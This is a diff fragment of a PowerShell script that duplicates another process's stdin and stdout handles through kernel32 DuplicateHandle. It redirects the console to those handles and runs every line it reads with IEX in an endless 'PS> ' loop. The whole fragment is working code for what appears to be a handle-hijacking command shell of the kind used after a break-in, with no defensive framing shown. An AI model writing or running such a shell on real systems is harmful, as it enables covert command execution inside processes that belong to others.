@@ -28,26 +28,28 @@ $res = [kernel32.func]::DuplicateHandle($sourceHandle,$remote_handle_in, $cHandl
 $in_handle = New-Object Microsoft.Win32.SafeHandles.SafeFileHandle $handle_in, 1
 $fsi = New-Object IO.FileStream $in_handle, ReadWrite
 $sr = New-Object IO.StreamReader $fsi
+[Console]::SetIn($sr)
 
 $handle_out = -1
 $res = [kernel32.func]::DuplicateHandle($sourceHandle,$remote_handle_out, $cHandle, [ref] $handle_out, 2, 1, 2)
 $out_handle = New-Object Microsoft.Win32.SafeHandles.SafeFileHandle $handle_out, 1
 $fso = New-Object IO.FileStream $out_handle, ReadWrite
 $sw = New-Object IO.StreamWriter $fso
-$sw.WriteLine("Hit Enter, Write Command then Enter again...");
 $sw.AutoFlush=1
-$sw.Write("PS> ")
+[Console]::SetOut($sw)
+[Console]::Write("PS> ")
+
 
 while (1) {
-	$i = $sr.ReadLine();
+	$i = [Console]::ReadLine();
 	if ($i) {
 		$o = IEX ($i);
 		$i = '';
-		$sw.WriteLine(($o | out-string));
+		[Console]::WriteLine(($o | out-string));
 		$o = '';
 		}
-	$sw.Write("PS> ");
+	[Console]::Write("PS> ");
 }
 
-$sw.WriteLine("Exiting...");
+[Console]::WriteLine("Exiting...");
 exit
